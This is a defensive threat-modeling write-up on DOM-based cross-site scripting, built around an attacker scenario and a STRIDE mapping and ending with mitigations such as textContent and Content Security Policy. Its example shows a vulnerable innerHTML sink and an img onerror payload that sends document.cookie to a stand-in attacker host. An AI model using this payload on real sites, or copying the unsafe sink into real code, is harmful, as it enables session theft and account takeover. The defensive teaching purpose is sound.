## Scenario: James's DOM-Based Cross-Site Scripting

James injects malicious JavaScript by supplying crafted input that the application writes directly into the DOM without sanitisation, causing arbitrary code to execute in the victim's browser. This occurs because:

1. **Unsafe DOM sinks:** The application uses dangerous APIs — `innerHTML`, `document.write`, `eval`, or `setTimeout` with a string argument to insert user-controlled data into the page.

2. **No output encoding:** Data from the URL fragment, query parameters, `localStorage`, or other attacker-reachable sources is placed into the DOM without encoding HTML special characters or escaping script contexts.

### Example

A customer support portal includes a search feature that reflects the query string back into the page using `document.getElementById('results').innerHTML = "Results for: " + location.search.split('?q=')[1]`. James crafts a URL with a query parameter containing `<img src=x onerror="fetch('https://attacker.example/c?d='+document.cookie)">` and sends it to a support agent. When the agent clicks the link, the browser executes James's script in the application's origin, exfiltrating the agent's session cookie to his server.

## Threat Modeling

### STRIDE

The scenario maps directly to STRIDE: **Tampering**.

James modifies the document the victim's browser renders, injecting code that executes with the full privileges of the application's origin. This allows him to read data, forge requests, and manipulate the page.

### What can go wrong?

DOM XSS gives an attacker code execution inside the victim's browser session, at the privilege level of the application. The attacker can steal session cookies, capture keystrokes, perform actions on the user's behalf, redirect to phishing pages, or modify page content to display false information. Unlike server-side XSS, DOM XSS payloads may never reach the server, making them invisible to server-side logging and WAF rules.

### What are we going to do about it?

Eliminate unsafe DOM manipulation and apply a defence-in-depth approach to script execution control.

1. Avoid unsafe DOM sinks entirely: replace `innerHTML` assignments with `textContent` or `innerText` when inserting plain text, and use framework-provided safe rendering APIs for structured content.
2. Encode all user-controlled data before inserting it into an HTML, JavaScript, CSS, or URL context — using context-appropriate encoding, not a generic HTML-escape.
3. Apply a strict Content Security Policy (CSP) that disallows inline scripts and restricts script sources to trusted origins, reducing the impact of any remaining sink.
4. Treat URL fragments, query parameters, and `postMessage` data as untrusted input and validate or sanitise them before use.